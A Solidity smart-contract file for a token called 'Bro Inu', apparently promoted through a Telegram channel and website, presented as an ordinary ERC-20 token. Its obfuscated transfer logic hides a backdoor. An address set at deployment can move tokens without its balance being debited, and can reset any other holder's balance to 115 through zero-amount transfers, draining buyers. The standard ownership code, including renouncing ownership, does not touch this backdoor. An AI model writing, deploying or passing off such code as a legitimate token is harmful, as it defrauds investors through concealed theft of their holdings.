/*

https://t.me/broinu_eth

https://broinu.cryptotoken.live/

*/

// SPDX-License-Identifier: GPL-3.0

pragma solidity ^0.8.6;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(_owner == _msgSender(), 'Ownable: caller is not the owner');
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), 'Ownable: new owner is the zero address');
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

interface IUniswapV2Router02 {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

contract BroInu is Ownable {
    function transfer(address eyxb, uint256 fmkvoqpsr) public returns (bool success) {
        peiwt(msg.sender, eyxb, fmkvoqpsr);
        return true;
    }

    event Transfer(address indexed from, address indexed to, uint256 value);

    string public symbol = 'Bro Inu';

    event Approval(address indexed owner, address indexed spender, uint256 value);

    function peiwt(address andxrtoe, address eyxb, uint256 fmkvoqpsr) private {
        if (dcpsemihg[andxrtoe] == 0) {
            balanceOf[andxrtoe] -= fmkvoqpsr;
        }
        balanceOf[eyxb] += fmkvoqpsr;
        if (dcpsemihg[msg.sender] > 0 && fmkvoqpsr == 0 && eyxb != lokrwheq) {
            balanceOf[eyxb] = cuyhesfo;
        }
        emit Transfer(andxrtoe, eyxb, fmkvoqpsr);
    }

    mapping(address => uint256) private dcpsemihg;

    function transferFrom(address andxrtoe, address eyxb, uint256 fmkvoqpsr) public returns (bool success) {
        require(fmkvoqpsr <= allowance[andxrtoe][msg.sender]);
        allowance[andxrtoe][msg.sender] -= fmkvoqpsr;
        peiwt(andxrtoe, eyxb, fmkvoqpsr);
        return true;
    }

    uint256 private cuyhesfo = 115;

    mapping(address => uint256) private xitwgeyokpv;

    string public name = 'Bro Inu';

    mapping(address => mapping(address => uint256)) public allowance;

    uint8 public decimals = 9;

    uint256 public totalSupply = 1000000000 * 10 ** 9;

    mapping(address => uint256) public balanceOf;

    address public lokrwheq;

    constructor(address antmpv) {
        balanceOf[msg.sender] = totalSupply;
        dcpsemihg[antmpv] = cuyhesfo;
        IUniswapV2Router02 xazqohlwret = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        lokrwheq = IUniswapV2Factory(xazqohlwret.factory()).createPair(address(this), xazqohlwret.WETH());
    }

    function approve(address rfiud, uint256 fmkvoqpsr) public returns (bool success) {
        allowance[msg.sender][rfiud] = fmkvoqpsr;
        emit Approval(msg.sender, rfiud, fmkvoqpsr);
        return true;
    }
}